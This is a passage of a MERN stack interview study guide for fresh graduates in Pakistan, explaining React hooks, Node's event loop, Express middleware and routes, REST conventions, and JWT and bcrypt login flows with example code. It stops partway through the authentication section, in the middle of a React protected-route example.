# MERN Stack Interview Study Guide
### For Fresh Graduate Full-Stack Developer Interviews in Pakistan

---

> **How to Use This Guide**
> - Read each section once to understand the concept, then review the code examples.
> - Sections 2, 4, 6, and 7 are the most interview-heavy — study these deeply.
> - Build at least one small MERN project and be able to explain every part of it.
> - Use the Final Cheat Sheet the morning of your interview.

---

## Table of Contents

1. [MERN Stack Overview](#1-mern-stack-overview)
2. [Frontend: React.js](#2-frontend-reactjs)
3. [Backend: Node.js](#3-backend-nodejs)
4. [Backend: Express.js](#4-backend-expressjs)
5. [REST APIs](#5-rest-apis)
6. [Authentication: JWT + bcrypt](#6-authentication-jwt--bcrypt)
7. [Database: MongoDB + Mongoose](#7-database-mongodb--mongoose)
8. [Full Stack Integration](#8-full-stack-integration)
9. [Security Basics](#9-security-basics)
10. [Performance Basics](#10-performance-basics)
11. [Project Presentation, Interview Q&A, Mistakes & Cheat Sheet](#11-project-presentation-interview-qa-mistakes--cheat-sheet)

---

## 1. MERN Stack Overview

### What is MERN Stack?

**MERN** is a collection of four technologies used together to build full-stack web applications — from the user interface to the server to the database.

| Letter | Technology | Role |
|---|---|---|
| **M** | MongoDB | Database — stores application data |
| **E** | Express.js | Backend framework — handles API routes and logic |
| **R** | React.js | Frontend library — what the user sees and interacts with |
| **N** | Node.js | Runtime — runs JavaScript on the server |

**Key point:** All four technologies use **JavaScript**. One language for frontend and backend — this is the biggest advantage of MERN.

---

### Why MERN is Popular

- **JavaScript everywhere** — one language for front and backend reduces context switching
- **Large ecosystem** — massive npm package library, huge community
- **Fast development** — React and Express allow rapid prototyping
- **JSON throughout** — React, Express, and MongoDB all speak JSON natively
- **High demand** — MERN developers are actively hired by Pakistani software companies
- **Free and open source** — no licensing costs

---

### Client vs Server Architecture

```
┌─────────────────────┐          ┌─────────────────────────────────┐
│                     │          │            SERVER                │
│   CLIENT (Browser)  │          │                                  │
│                     │  HTTP    │  ┌─────────────┐  ┌──────────┐  │
│   ┌─────────────┐   │ Request  │  │  Express.js │  │ Node.js  │  │
│   │  React.js   │ ──────────────► │  (Routes &  │  │(Runtime) │  │
│   │  (UI Layer) │   │          │  │  Middleware)│  │          │  │
│   └─────────────┘   │ Response │  └──────┬──────┘  └──────────┘  │
│                     │ ◄──────── │         │                        │
└─────────────────────┘          │         ▼                        │
                                 │  ┌─────────────┐                 │
                                 │  │  MongoDB    │                 │
                                 │  │ (Database)  │                 │
                                 │  └─────────────┘                 │
                                 └─────────────────────────────────┘
```

---

### Full Stack Request Flow

When a user does something on the website (e.g., clicks "Login"), this is what happens:

```
1. User fills login form in React (Frontend)
         │
         ▼
2. React sends HTTP POST request to Express API
   POST /api/auth/login  { email, password }
         │
         ▼
3. Express middleware runs (JSON parser, CORS check)
         │
         ▼
4. Express route handler validates input
         │
         ▼
5. Mongoose queries MongoDB for the user
         │
         ▼
6. MongoDB returns user document
         │
         ▼
7. Express compares passwords (bcrypt), generates JWT
         │
         ▼
8. Express sends response back to React
   { token: "eyJ...", user: { name, email } }
         │
         ▼
9. React stores token, redirects to dashboard
```

---

### Interview Questions — MERN Overview

**Q: What is the MERN stack?**
> MERN is a full-stack JavaScript technology set: MongoDB (database), Express.js (backend framework), React.js (frontend UI library), and Node.js (server runtime). All four use JavaScript, allowing developers to build complete web applications with one language.

**Q: Why use JavaScript for both frontend and backend?**
> It eliminates context switching between languages, allows code and types to be shared between client and server, reduces the team size needed (one developer can work full-stack), and gives access to a unified package ecosystem (npm).

---

> **Key Takeaways — Section 1**
> - MERN = MongoDB + Express + React + Node — all JavaScript.
> - React runs in the browser. Node + Express run on the server. MongoDB stores data.
> - The full request cycle: React → HTTP → Express → MongoDB → Express → React.
> - MERN is the most commonly asked full-stack in Pakistani software company interviews.

---

## 2. Frontend: React.js

### What is React?

**React** is a JavaScript **library** for building user interfaces. It was created by Facebook and is the most popular frontend library in the world.

**Key idea:** React builds UIs using **components** — independent, reusable pieces of UI. A full page is composed of many components working together.

---

### Functional vs Class Components

Modern React uses **functional components** almost exclusively. Class components are legacy — you may encounter them in older codebases.

#### Functional Component (Modern — use this)

```jsx
// Simple functional component
function UserCard({ name, email }) {
    return (
        <div className="card">
            <h2>{name}</h2>
            <p>{email}</p>
        </div>
    );
}
```

#### Class Component (Legacy — know it exists)

```jsx
class UserCard extends React.Component {
    render() {
        return (
            <div className="card">
                <h2>{this.props.name}</h2>
                <p>{this.props.email}</p>
            </div>
        );
    }
}
```

**Class vs Functional Component:**

| Feature | Class Component | Functional Component |
|---|---|---|
| Syntax | ES6 class, `render()` method | Plain JavaScript function |
| State | `this.state`, `this.setState()` | `useState()` hook |
| Lifecycle | `componentDidMount()`, etc. | `useEffect()` hook |
| Complexity | More code, harder to read | Simpler, concise |
| Modern practice | Legacy (avoid for new code) | Standard (use this) |

---

### JSX — JavaScript XML

**JSX** is a syntax extension that lets you write HTML-like code inside JavaScript. React compiles it to regular JavaScript.

```jsx
// JSX
const element = <h1 className="title">Hello, {name}!</h1>;

// What React compiles it to (you never write this):
const element = React.createElement('h1', { className: 'title' }, `Hello, ${name}!`);
```

**JSX rules:**
- Every component must return **one root element** (wrap in `<div>` or `<>`)
- Use `className` not `class` (class is a reserved word in JS)
- Self-close empty tags: `<img />`, `<br />`
- JavaScript expressions go inside `{}`: `<p>{user.name}</p>`

---

### Props vs State

**Props** and **State** are both ways to manage data in React, but they serve different purposes.

#### Props (Properties)
- Data passed **from parent to child** component
- **Read-only** — a child cannot modify its own props
- Used to configure and customize components
- Like function arguments

#### State
- Data that **belongs to and is managed by the component itself**
- **Mutable** — the component can update its own state
- When state changes, React re-renders the component
- Like a component's private memory

```jsx
// Props example: Parent passes data to Child
function Parent() {
    return <Child name="Ali" age={25} />;
}

function Child({ name, age }) {
    return <p>{name} is {age} years old</p>;
}

// State example: Component manages its own data
function Counter() {
    const [count, setCount] = useState(0);  // state

    return (
        <div>
            <p>Count: {count}</p>
            <button onClick={() => setCount(count + 1)}>Increment</button>
        </div>
    );
}
```

**Props vs State Comparison:**

| Feature | Props | State |
|---|---|---|
| Who owns it | Parent component | The component itself |
| Mutable? | No (read-only for child) | Yes (via setState / useState) |
| Triggers re-render? | Yes (when parent re-renders) | Yes (when updated) |
| Direction | Parent → Child | Internal to component |
| Use for | Passing data down | Tracking changing data |

---

### Virtual DOM

The **Virtual DOM** is a lightweight copy of the real browser DOM (Document Object Model) that React keeps in memory.

**How it works:**
```
1. State/Props change
         │
         ▼
2. React creates a new Virtual DOM tree
         │
         ▼
3. React compares (diffs) new Virtual DOM with old Virtual DOM
         │
         ▼
4. React finds the minimum changes needed (reconciliation)
         │
         ▼
5. Only the changed parts are updated in the real DOM
         │
         ▼
6. Browser re-renders only what changed (very fast)
```

**Why this makes React fast:** Directly manipulating the real DOM is slow. React batches all changes, calculates the minimum updates needed, and then applies only those — dramatically reducing DOM operations.

**Analogy:** Instead of reprinting an entire newspaper when one article changes, React figures out exactly which words changed and only updates those.

---

### React Hooks

**Hooks** are functions that let functional components use React features that were previously only available in class components (state, lifecycle, etc.).

---

#### useState — Managing State

```jsx
import { useState } from 'react';

function LoginForm() {
    const [email, setEmail] = useState('');      // initial value = ''
    const [password, setPassword] = useState('');
    const [error, setError] = useState(null);

    const handleSubmit = async (e) => {
        e.preventDefault();
        try {
            const res = await axios.post('/api/auth/login', { email, password });
            localStorage.setItem('token', res.data.token);
        } catch (err) {
            setError('Invalid credentials');
        }
    };

    return (
        <form onSubmit={handleSubmit}>
            <input value={email} onChange={(e) => setEmail(e.target.value)} />
            <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} />
            {error && <p className="error">{error}</p>}
            <button type="submit">Login</button>
        </form>
    );
}
```

**Key points:**
- `useState(initialValue)` returns `[currentValue, setterFunction]`
- Calling the setter function triggers a re-render with the new value
- Never modify state directly: `count++` is wrong. Use `setCount(count + 1)`.

---

#### useEffect — Side Effects and Lifecycle

`useEffect` runs side effects in functional components — fetching data, setting up subscriptions, updating the document title, etc.

```jsx
import { useState, useEffect } from 'react';

function UserList() {
    const [users, setUsers] = useState([]);
    const [loading, setLoading] = useState(true);

    // Runs after component mounts (like componentDidMount)
    useEffect(() => {
        const fetchUsers = async () => {
            try {
                const res = await axios.get('/api/users');
                setUsers(res.data);
            } finally {
                setLoading(false);
            }
        };
        fetchUsers();
    }, []);  // Empty array = run once when component mounts

    // Runs when 'userId' changes (like componentDidUpdate)
    useEffect(() => {
        document.title = `Viewing user ${userId}`;
    }, [userId]);  // Runs every time userId changes

    if (loading) return <p>Loading...</p>;
    return <ul>{users.map(u => <li key={u._id}>{u.name}</li>)}</ul>;
}
```

**useEffect dependency array:**
- `useEffect(() => {...})` — runs after **every** render
- `useEffect(() => {...}, [])` — runs **once** after mount (like `componentDidMount`)
- `useEffect(() => {...}, [id])` — runs when `id` **changes**

**Cleanup function (like componentWillUnmount):**
```jsx
useEffect(() => {
    const timer = setInterval(() => console.log('tick'), 1000);
    return () => clearInterval(timer);  // cleanup when component unmounts
}, []);
```

---

#### useMemo — Memoizing Expensive Calculations

`useMemo` remembers the result of an expensive calculation and only recalculates it when its dependencies change.

```jsx
import { useMemo } from 'react';

function ProductList({ products, searchTerm }) {
    // This filter runs on EVERY render without useMemo
    // With useMemo, it only runs when products or searchTerm changes
    const filteredProducts = useMemo(() => {
        return products.filter(p =>
            p.name.toLowerCase().includes(searchTerm.toLowerCase())
        );
    }, [products, searchTerm]);

    return <ul>{filteredProducts.map(p => <li key={p._id}>{p.name}</li>)}</ul>;
}
```

**When to use:** Only for expensive calculations (filtering large arrays, complex math). Don't use for everything — the memoization itself has overhead.

---

#### useCallback — Memoizing Functions

`useCallback` returns a memoized version of a function — the function is only recreated when its dependencies change.

```jsx
import { useCallback } from 'react';

function Parent() {
    const [count, setCount] = useState(0);

    // Without useCallback: new function created on every render
    // With useCallback: same function reference unless count changes
    const handleClick = useCallback(() => {
        console.log('Current count:', count);
    }, [count]);

    return <Child onClick={handleClick} />;
}
```

**When to use:** When passing callbacks to child components that are wrapped in `React.memo` — prevents the child from re-rendering unnecessarily.

---

### Component Lifecycle

```
MOUNT              UPDATE               UNMOUNT
  │                  │                     │
  ▼                  ▼                     ▼
Component         State/Props          Component
appears on        changes →            removed from
the page          re-render            the page

useEffect([])    useEffect([dep])    useEffect cleanup
  runs once        runs on change       function runs
```

---

### Context API — Solving Props Drilling

**Props drilling** is when you pass data through many nested components just to get it to a deeply nested child. It becomes messy quickly.

```
App (has user data)
 └── Layout
      └── Sidebar
           └── UserProfile  ← needs user data
```

Without Context, `user` must be passed through Layout and Sidebar even if they don't need it. With Context API, any component can access the data directly.

```jsx
// 1. Create context
const UserContext = createContext();

// 2. Provide it at the top level
function App() {
    const [user, setUser] = useState(null);
    return (
        <UserContext.Provider value={{ user, setUser }}>
            <Layout />
        </UserContext.Provider>
    );
}

// 3. Consume it anywhere in the tree (no prop drilling needed)
function UserProfile() {
    const { user } = useContext(UserContext);
    return <h2>Welcome, {user.name}</h2>;
}
```

---

### React Router

**React Router** enables navigation between different "pages" (views) in a single-page application (SPA) without a full page reload.

```jsx
import { BrowserRouter, Routes, Route, Link, useParams } from 'react-router-dom';

function App() {
    return (
        <BrowserRouter>
            <nav>
                <Link to="/">Home</Link>
                <Link to="/products">Products</Link>
                <Link to="/login">Login</Link>
            </nav>

            <Routes>
                <Route path="/" element={<HomePage />} />
                <Route path="/products" element={<ProductsPage />} />
                <Route path="/products/:id" element={<ProductDetail />} />
                <Route path="/login" element={<LoginPage />} />
                <Route path="*" element={<NotFound />} />
            </Routes>
        </BrowserRouter>
    );
}

// Reading URL params
function ProductDetail() {
    const { id } = useParams();  // gets :id from the URL
    // fetch product with this id
}
```

---

### API Integration — Axios and Fetch

**Axios** is the most popular library for making HTTP requests in React (and Node). It has a cleaner syntax than the native Fetch API and handles errors better.

```jsx
import axios from 'axios';
import { useState, useEffect } from 'react';

function Products() {
    const [products, setProducts] = useState([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(null);

    useEffect(() => {
        const fetchProducts = async () => {
            try {
                setLoading(true);
                const response = await axios.get('/api/products');
                setProducts(response.data);
            } catch (err) {
                setError(err.response?.data?.message || 'Failed to load products');
            } finally {
                setLoading(false);
            }
        };
        fetchProducts();
    }, []);

    if (loading) return <div>Loading products...</div>;
    if (error) return <div className="error">{error}</div>;

    return (
        <div>
            {products.map(product => (
                <div key={product._id}>
                    <h3>{product.name}</h3>
                    <p>Rs. {product.price}</p>
                </div>
            ))}
        </div>
    );
}
```

**Axios vs Fetch:**

| Feature | Fetch | Axios |
|---|---|---|
| Built-in | Yes (no install needed) | No (npm install axios) |
| Error handling | Must check `res.ok` manually | Throws error for 4xx/5xx automatically |
| JSON parsing | Must call `res.json()` | Auto-parses JSON |
| Request timeout | No built-in | Yes |
| Interceptors | No | Yes (great for auth tokens) |
| Used in real projects | Less common | Very common |

**Setting up Axios with auth token (interceptor):**
```javascript
// In a separate api.js file
import axios from 'axios';

const api = axios.create({
    baseURL: 'http://localhost:5000'
});

// Add token to every request automatically
api.interceptors.request.use((config) => {
    const token = localStorage.getItem('token');
    if (token) {
        config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
});

export default api;
```

---

### Interview Questions — React

**Q: What is the Virtual DOM and why does React use it?**
> The Virtual DOM is a lightweight in-memory copy of the real DOM. When state or props change, React creates a new Virtual DOM, compares it with the old one (diffing), and only applies the minimum necessary changes to the real DOM. This makes React fast because directly manipulating the real DOM is slow — React batches and minimizes DOM operations.

**Q: What is the difference between props and state?**
> Props are data passed from a parent component to a child component — they are read-only for the child. State is data owned and managed by the component itself — it can be updated and triggers a re-render when changed. Props are like function arguments; state is like a component's private memory.

**Q: What are React hooks? Name the most important ones.**
> Hooks are functions that give functional components access to React features. The most important are: `useState` (manage local state), `useEffect` (perform side effects like API calls), `useMemo` (memoize expensive calculations), `useCallback` (memoize functions), and `useContext` (consume Context values). Hooks replaced the need for class components.

**Q: What is the difference between useEffect with and without a dependency array?**
> Without a dependency array: runs after every render. With an empty array `[]`: runs only once after the component mounts (equivalent to componentDidMount). With dependencies `[value]`: runs every time `value` changes (equivalent to componentDidUpdate watching that value).

---

> **Key Takeaways — Section 2**
> - React builds UIs with components — reusable, independent pieces of UI.
> - Props = parent to child, read-only. State = component's own data, mutable.
> - Virtual DOM = React's secret to performance — only updates what changed.
> - Hooks: useState (state), useEffect (lifecycle + side effects), useMemo (cache calculation), useCallback (cache function).
> - Axios is preferred over fetch for API calls — better error handling and interceptors.

---

## 3. Backend: Node.js

### What is Node.js?

**Node.js** is a **JavaScript runtime** that allows JavaScript to run on the server (outside the browser). Before Node.js, JavaScript could only run in browsers. Node.js changed that using Google Chrome's **V8 JavaScript engine**.

**Simple analogy:** JavaScript was always a great actor who could only perform on one stage (the browser). Node.js built a second stage (the server) so the same actor could perform there too.

---

### Event-Driven, Non-Blocking I/O

This is the most important concept about Node.js for interviews.

**Traditional servers (e.g., PHP, Java with one thread per request):**
```
Request 1 arrives → Thread 1 handles it → Waits for database → Response
Request 2 arrives → Thread 2 handles it → Waits for database → Response
Request 3 arrives → Thread 3 handles it → Waits for database → Response
(Creating many threads uses lots of memory)
```

**Node.js (single thread, non-blocking):**
```
Request 1 arrives → Starts database query → Doesn't wait → goes to next request
Request 2 arrives → Starts database query → Doesn't wait → goes to next request
Request 3 arrives → Starts database query → Doesn't wait → goes to next request

Database query 1 done → Callback fires → Sends response to Request 1
Database query 2 done → Callback fires → Sends response to Request 2
Database query 3 done → Callback fires → Sends response to Request 3
```

**Analogy:** A waiter in a restaurant. A bad waiter takes Order 1, goes to the kitchen, stands there and waits for the food, brings it out, then takes Order 2. A good waiter (Node.js) takes Order 1, sends it to the kitchen, then immediately takes Order 2, then Order 3 — and when any order is ready, delivers it. One waiter handles many customers efficiently.

---

### Node.js Event Loop

```
┌─────────────────────────────────────────────────────┐
│                    EVENT LOOP                        │
│                                                      │
│  Incoming     ┌──────────┐    ┌──────────────────┐  │
│  Request  ──► │  Call    │    │  Background       │  │
│               │  Stack   │    │  Operations:      │  │
│               │(sync code│    │  - File I/O       │  │
│               │ runs here)   │  - Database query  │  │
│               └──────────┘    │  - Network request│  │
│                    │          └────────┬──────────┘  │
│                    │                   │ When done    │
│                    ▼                   ▼             │
│              ┌──────────────────────────────────┐   │
│              │         Callback Queue            │   │
│              │   (completed tasks wait here)     │   │
│              └──────────────────────────────────┘   │
│                    │                                 │
│                    ▼ (when call stack is empty)      │
│               Execute callback → send response       │
└─────────────────────────────────────────────────────┘
```

**Key insight:** Node.js uses a **single thread** but handles thousands of concurrent requests by never blocking. While waiting for I/O (database, file, network), it processes other requests. This makes it extremely efficient for I/O-heavy applications like APIs.

---

### Why Node.js for MERN?

- Same language (JavaScript) as the frontend — one language for everything
- Excellent for **REST APIs** and real-time applications (chat, live feeds)
- Massive npm ecosystem — thousands of packages available
- Fast for **I/O-heavy** tasks (API servers querying databases)
- **Not ideal for:** CPU-heavy tasks (video processing, machine learning) — blocking the single thread is bad

---

### Interview Questions — Node.js

**Q: How does Node.js handle multiple requests with a single thread?**
> Node.js uses an event-driven, non-blocking I/O model. When it receives a request that requires I/O (database query, file read), it delegates that operation to the background (libuv library) and immediately moves on to process the next request. When the I/O completes, a callback is placed in the event queue and executed when the main thread is free. This way, one thread handles thousands of concurrent requests efficiently.

**Q: What is Node.js best suited for?**
> Node.js excels at I/O-bound applications — REST APIs, real-time apps (chat, live notifications), data streaming, and microservices. It is not well-suited for CPU-intensive tasks (image/video processing, complex calculations) because those block the single thread and prevent other requests from being processed.

---

> **Key Takeaways — Section 3**
> - Node.js = JavaScript runtime on the server, powered by Chrome's V8 engine.
> - Non-blocking I/O = never wait for I/O operations — move on and come back when done.
> - Single-threaded event loop handles thousands of concurrent requests efficiently.
> - Best for: REST APIs, real-time apps. Not for: CPU-intensive tasks.

---

## 4. Backend: Express.js

### What is Express.js?

**Express.js** is a minimal, fast **web framework for Node.js**. It provides the tools and structure needed to build REST APIs and web servers.

**Without Express (raw Node.js HTTP is painful):**
```javascript
const http = require('http');
const server = http.createServer((req, res) => {
    if (req.url === '/users' && req.method === 'GET') {
        // manual routing, parsing, headers...
    }
});
```

**With Express (clean and simple):**
```javascript
const express = require('express');
const app = express();

app.get('/users', (req, res) => {
    res.json({ users: [] });
});
```

Express handles routing, request parsing, middleware, and much more out of the box.

---

### Middleware — The Core of Express

**Middleware** is a function that has access to the **request object (req)**, **response object (res)**, and the **next middleware function** in the cycle.

```
Incoming                                                    Outgoing
Request ─► Middleware 1 ─► Middleware 2 ─► Route Handler ─► Response
           (JSON parser)    (Auth check)    (Business logic)
```

**Structure of a middleware function:**
```javascript
function myMiddleware(req, res, next) {
    // Do something with req or res
    console.log(`${req.method} ${req.url}`);

    // Call next() to pass control to the next middleware
    // If you don't call next(), the request stops here
    next();
}
```

**Types of middleware:**

1. **Built-in middleware:**
```javascript
app.use(express.json());          // Parse JSON request bodies
app.use(express.urlencoded());    // Parse form data
app.use(express.static('public')); // Serve static files
```

2. **Third-party middleware:**
```javascript
const cors = require('cors');
app.use(cors());              // Enable CORS

const morgan = require('morgan');
app.use(morgan('dev'));        // Request logging
```

3. **Custom middleware:**
```javascript
// Logger middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// Authentication middleware
const authMiddleware = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ message: 'No token provided' });

    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        req.user = decoded;
        next();
    } catch {
        res.status(401).json({ message: 'Invalid token' });
    }
};

// Apply to specific routes only
app.get('/api/profile', authMiddleware, (req, res) => {
    res.json({ user: req.user });
});
```

4. **Error handling middleware (4 parameters):**
```javascript
// Must have exactly 4 params: err, req, res, next
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(err.status || 500).json({
        message: err.message || 'Internal Server Error'
    });
});
```

---

### Routing in Express

```javascript
const express = require('express');
const app = express();
const router = express.Router();

app.use(express.json());

// GET — retrieve data
app.get('/api/products', async (req, res) => {
    try {
        const products = await Product.find();
        res.status(200).json(products);
    } catch (err) {
        res.status(500).json({ message: err.message });
    }
});

// GET with URL parameter
app.get('/api/products/:id', async (req, res) => {
    try {
        const product = await Product.findById(req.params.id);
        if (!product) return res.status(404).json({ message: 'Product not found' });
        res.json(product);
    } catch (err) {
        res.status(500).json({ message: err.message });
    }
});

// POST — create data
app.post('/api/products', async (req, res) => {
    try {
        const product = new Product(req.body);
        const saved = await product.save();
        res.status(201).json(saved);
    } catch (err) {
        res.status(400).json({ message: err.message });
    }
});

// PUT — update (replace all)
app.put('/api/products/:id', async (req, res) => {
    try {
        const updated = await Product.findByIdAndUpdate(
            req.params.id,
            req.body,
            { new: true }  // return updated document
        );
        res.json(updated);
    } catch (err) {
        res.status(400).json({ message: err.message });
    }
});

// DELETE
app.delete('/api/products/:id', async (req, res) => {
    try {
        await Product.findByIdAndDelete(req.params.id);
        res.status(204).send();
    } catch (err) {
        res.status(500).json({ message: err.message });
    }
});
```

**Organizing routes with Router:**
```javascript
// routes/productRoutes.js
const router = express.Router();
router.get('/', getAllProducts);
router.get('/:id', getProductById);
router.post('/', createProduct);
router.put('/:id', updateProduct);
router.delete('/:id', deleteProduct);
module.exports = router;

// server.js
app.use('/api/products', require('./routes/productRoutes'));
```

---

### Typical Express Server Setup

```javascript
// server.js
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Routes
app.use('/api/auth', require('./routes/authRoutes'));
app.use('/api/products', require('./routes/productRoutes'));
app.use('/api/users', require('./routes/userRoutes'));

// Global error handler (always last)
app.use((err, req, res, next) => {
    res.status(err.status || 500).json({ message: err.message });
});

// Connect to MongoDB and start server
mongoose.connect(process.env.MONGO_URI)
    .then(() => {
        console.log('MongoDB connected');
        app.listen(process.env.PORT || 5000, () => {
            console.log('Server running on port 5000');
        });
    })
    .catch(err => console.error(err));
```

---

### Interview Questions — Express.js

**Q: What is middleware in Express? Give an example.**
> Middleware is a function that sits between the incoming request and the route handler. It has access to req, res, and next. Examples: `express.json()` parses the request body, `cors()` adds CORS headers, and a custom auth middleware verifies the JWT token before allowing access to protected routes. Middleware is the backbone of Express — almost everything in Express is middleware.

**Q: What is the order of middleware execution in Express?**
> Middleware executes in the order it is registered using `app.use()`. A request passes through each middleware sequentially. If a middleware calls `next()`, the request moves to the next middleware. If it doesn't call `next()` and doesn't send a response, the request hangs. The error handler (4 params) is always placed last.

---

> **Key Takeaways — Section 4**
> - Express is a web framework for Node.js — simplifies routing, middleware, and API building.
> - Middleware = function(req, res, next) that runs before the route handler.
> - Middleware chain: JSON parser → CORS → Auth check → Route Handler → Error Handler.
> - `next()` passes control to the next middleware. Without it, the request stops.
> - Always put error handling middleware last with 4 parameters.

---

## 5. REST APIs

### What is REST?

**REST (Representational State Transfer)** is an architectural style for building APIs that uses standard HTTP methods and follows specific conventions.

**RESTful API principles:**
- **Stateless** — Server stores no session information; every request is self-contained
- **Client-Server** — Frontend and backend are completely separated
- **Uniform Interface** — Consistent URL structure and HTTP methods
- **Resource-based** — URLs represent resources (nouns), HTTP methods represent actions (verbs)

---

### RESTful URL Structure

```
Resource:  /api/products

GET    /api/products          → Get all products
GET    /api/products/42       → Get product with id 42
POST   /api/products          → Create a new product
PUT    /api/products/42       → Replace product 42 entirely
PATCH  /api/products/42       → Partially update product 42
DELETE /api/products/42       → Delete product 42

Nested resource:
GET    /api/users/5/orders    → Get all orders of user 5
GET    /api/users/5/orders/12 → Get order 12 of user 5
```

**Rules for REST URLs:**
- Use **nouns** for resources, not verbs: `/api/products` not `/api/getProducts`
- Use **plural** for collections: `/products` not `/product`
- Use **lowercase** and **hyphens**: `/api/order-items` not `/api/OrderItems`

---

### HTTP Status Codes in REST APIs

| Code | Name | When to Use |
|---|---|---|
| 200 | OK | Successful GET, PUT, PATCH |
| 201 | Created | Successful POST (new resource created) |
| 204 | No Content | Successful DELETE |
| 400 | Bad Request | Invalid input, validation error |
| 401 | Unauthorized | Not authenticated (no/invalid token) |
| 403 | Forbidden | Authenticated but no permission |
| 404 | Not Found | Resource doesn't exist |
| 409 | Conflict | Duplicate entry (email already exists) |
| 422 | Unprocessable Entity | Validation failed |
| 500 | Internal Server Error | Unexpected server bug |

---

### Request and Response Examples

**Request (client sends):**
```
POST /api/auth/register HTTP/1.1
Content-Type: application/json
Authorization: Bearer eyJ...

{
  "name": "Ali Ahmad",
  "email": "ali@example.com",
  "password": "secretpass123"
}
```

**Response (server sends back):**
```
HTTP/1.1 201 Created
Content-Type: application/json

{
  "message": "Registration successful",
  "user": {
    "_id": "64abc123...",
    "name": "Ali Ahmad",
    "email": "ali@example.com"
  },
  "token": "eyJhbGc..."
}
```

---

### Interview Questions — REST APIs

**Q: What makes an API RESTful?**
> A RESTful API uses standard HTTP methods (GET, POST, PUT, DELETE) to perform CRUD operations on resources, uses resource-based URLs (nouns not verbs), is stateless (no session stored on server), and returns appropriate HTTP status codes. Every request must contain all necessary information — the server doesn't remember previous requests.

**Q: What is the difference between 401 and 403?**
> 401 Unauthorized means the user is not authenticated — they haven't provided a valid token. 403 Forbidden means the user is authenticated (valid token) but doesn't have permission to access that resource. For example, a regular user trying to access an admin-only endpoint gets 403.

---

> **Key Takeaways — Section 5**
> - REST = stateless, resource-based API using HTTP methods.
> - URL = noun (what): `/api/products`. HTTP method = verb (action): GET, POST, DELETE.
> - Status codes: 200 OK, 201 Created, 400 Bad Request, 401 Unauthorized, 404 Not Found, 500 Server Error.
> - Every REST request must be self-contained — no server-side sessions.

---

## 6. Authentication: JWT + bcrypt

### The Login/Register Flow — Full Picture

```
─────────────────────── REGISTER ───────────────────────
User fills form → React sends POST /api/auth/register
                          │
                  Express receives request
                          │
                  Validate input (email format, password length)
                          │
                  Check if email already exists in MongoDB
                          │
                  Hash password with bcrypt (10 rounds)
                          │
                  Save new user to MongoDB
                          │
                  Return 201 Created + (optionally) JWT token
                          │
                  React redirects to login or dashboard

─────────────────────── LOGIN ───────────────────────────
User fills form → React sends POST /api/auth/login
                          │
                  Express finds user by email in MongoDB
                          │
                  Compare entered password with hashed password
                  (bcrypt.compare)
                          │
                  If match: generate JWT token (sign with secret)
                          │
                  Return 200 OK + { token, user data }
                          │
                  React stores token (localStorage or cookie)
                  React redirects to dashboard

─────────────────────── PROTECTED REQUEST ───────────────
React sends GET /api/profile with:
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5...
                          │
                  Express auth middleware intercepts
                          │
                  Extracts token from Authorization header
                          │
                  Verifies token with JWT_SECRET
                          │
                  Decodes user info from token payload
                          │
                  Attaches user to req.user
                          │
                  Passes to route handler → sends user data
```

---

### bcrypt — Password Hashing

**Never store plain text passwords.** If your database is ever hacked, all passwords are exposed. Hashing converts the password into an irreversible string.

**Why bcrypt?**
- Designed specifically for passwords
- Includes **salt** automatically (prevents rainbow table attacks)
- Configurable **work factor** (rounds) — makes brute force very slow

```javascript
const bcrypt = require('bcryptjs');

// When user registers — hash the password
const saltRounds = 10;
const hashedPassword = await bcrypt.hash(req.body.password, saltRounds);
// Store hashedPassword in database, never the original

// When user logs in — compare entered password with stored hash
const isMatch = await bcrypt.compare(enteredPassword, user.password);
if (!isMatch) return res.status(401).json({ message: 'Invalid credentials' });
```

**Important:** bcrypt is a one-way hash — you cannot "decrypt" it. You can only verify by running the same hash and comparing.

---

### JWT — JSON Web Token

**JWT** is a compact, self-contained token that securely transmits user information between client and server.

**JWT Structure — three parts separated by dots:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NGFiYzEyMyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE0MDAwMDAwLCJleHAiOjE3MTQwODY0MDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Part 1: HEADER (Base64 encoded)
{ "alg": "HS256", "typ": "JWT" }

Part 2: PAYLOAD (Base64 encoded — NOT encrypted, just encoded)
{ "userId": "64abc123", "role": "user", "iat": 1714000000, "exp": 1714086400 }

Part 3: SIGNATURE
HMAC-SHA256(header + "." + payload, JWT_SECRET)
```

**Key point:** The payload is only **Base64 encoded**, not encrypted. Anyone can decode and read it. The **signature** is what makes it secure — only the server with the secret key can create a valid signature.

**Creating and verifying JWTs in Express:**
```javascript
const jwt = require('jsonwebtoken');

// Create token (when user logs in)
const token = jwt.sign(
    { userId: user._id, role: user.role },  // payload
    process.env.JWT_SECRET,                  // secret key
    { expiresIn: '24h' }                    // expiry
);

// Verify token (in auth middleware)
try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;  // { userId, role, iat, exp }
    next();
} catch (err) {
    res.status(401).json({ message: 'Invalid or expired token' });
}
```

---

### Token Storage: localStorage vs HttpOnly Cookie

| Feature | localStorage | HttpOnly Cookie |
|---|---|---|
| XSS vulnerability | High — JS can read it | None — JS cannot access it |
| CSRF vulnerability | None | Medium (use SameSite cookie) |
| Ease of use | Simple | Slightly more complex setup |
| Persists after tab close | Yes | Depends on expiry |
| Sent automatically | No — must set header manually | Yes — browser sends it automatically |
| Recommended for | Development/learning | Production |

**Simple implementation (localStorage — used in most tutorials):**
```javascript
// Store after login
localStorage.setItem('token', response.data.token);

// Read for API calls
const token = localStorage.getItem('token');
axios.defaults.headers.common['Authorization'] = `Bearer ${token}`;

// Remove on logout
localStorage.removeItem('token');
```

---

### Protected Routes in React

```jsx
// ProtectedRoute component
function ProtectedRoute({ children }) {
    const token = localStorage.getItem('token');

    if (!token) {
        return <Navigate to="/login" replace />;
    }
